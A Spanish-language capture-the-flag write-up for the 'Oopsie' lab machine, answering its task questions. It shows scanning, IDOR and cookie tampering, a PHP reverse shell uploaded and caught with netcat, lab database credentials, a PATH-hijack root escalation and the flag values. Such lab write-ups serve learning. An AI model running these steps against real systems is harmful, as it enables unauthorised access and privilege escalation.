---
title: Máquina Oopsie
published: true
---

Jorge Marco Arráez

## [](#header-3) 1)    With what kind of tool can intercept web traffic? 

Proxy

## [](#header-3) 2)     What is the path to the directory on the webserver that returns a login page?  

sudo nmap -sS --min-rate 5000 -Pn -n -oN nmap/initial $IP
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Con un segundo escaneo me aseguro de no haberme dejado nada: 

sudo nmap -sS -A --min-rate 5000 -Pn -p- -n -oN nmap/initial $IP

El servidor web es Apache/2.4.29 (Ubuntu). Tiene ssh abierto (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0))

Para encontrar los directorios utilizo gobuster y uno de los muchos diccionarios de Daniel Miessler.

```
gobuster dir -w /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.88.50
```

Todos los directorios que me reporta gobuster deniegan el acceso cuando intento acceder a ellos. Voy a probar a usar burpsuite para ver si puedo sacar más información

Trasteando un poco con burpsuite he encontrado esto en las peticiones, pero no tengo muy claro como lo he hecho, miraré el walktrhough al acabar. 


/cdn-cgi/login

También veo que existe

/cdn-cgi/login/script.js

Al intentar acceder a http://$IP/js, en la respuesta que manda el servidor aparece que acepta */*, lo que quiere decir que acepta cualquier tipo de MIME. 

## [](#header-3) 3)    What can be modified in Firefox to get access to the upload page? 

cookie

## [](#header-3) 4)    What is the access ID of the admin user?  

La página nos da la posibilidad de registrarnos como invitados, asi que tomamos esa oportunidad.
Vamos a la pestaña de account y nos fijamos en la url y vemos que hay un campo que ponec account&id=2, asumiendo que el administrador tendrá un id menor, pruebo con 1, y efectivamente así es. 

Su accessid es 34322, su username es admin y su correo es admin@megacorp.com

## [](#header-3) 5)    On uploading a file, what directory does that file appear in on the server?  

Ahora sí que puedo usar la información que me ha reportado gobuster, la carpeta a la que se suben los archivos es /uploads.

No sé si me he adelantado un poco, pero he subido el fichero nc64.exe para tenerlo ya disponible para hacer una reverse shell. 
Compruebo que funciona accediendo a http://10.129.88.50/uploads/nc64.exe, y viendo que firefox descarga el recurso.

Tras revisar todo el código de las páginas como indica la pista, incluido los .js, pruebo a hacer una reverse shell con php con el script de pentestmonkey. Lo edito y pongo mi direccion IP y el puerto en el que le voy a indicar a netcat que escuche, el 443. 

Tras subir el archivo, ejecuto 

```
nc -lnvp 443
```

y accedo a http://$IP/uploads/reverse-shell.php

En la terminal veo que he conseguido acceder.

Buscando entre los directorios consigo la user flag, aunque todavía no puedo enviarla.

El walkthrough nos indica que es conveniente ejecutar el siguiente comando para obtener una shell interactiva:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Moviendome entre los directorios llego a cdn-cgi/login, donde están alojados varios archivos .php, entre ellos db.php 
Su contenido es:

```
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

```
cat * | grep -i passwd*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```

el comando que buscamos es find

## [](#header-3) 6)    What is the file that contains the password that is shared with the robert user?  

db.php

## [](#header-3) 7)     What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 

find

## [](#header-3) 8)    Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 

root

## [](#header-3) 9)   What SUID stands for?  

Set owner User ID

## [](#header-3) 10)   What is the name of the executable being called in an insecure manner? 

cat

## [](#header-3) 11)   Submit user flag  

Tras establecer la conexión navegamos a robert y con cat conseguimos los contenidos de la flag.


```
user=f2c74ee8db7983851ab2a96a44eb7981
```

## [](#header-3) 12)  Submit root flag 

```
cd tmp
touch cat
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
echo $PATH
bugtracker
cd ..
ls
cd root
ls
xxd root.txt
```

```
root=af13b0bee69f8a877c3faf667f7beacf
```
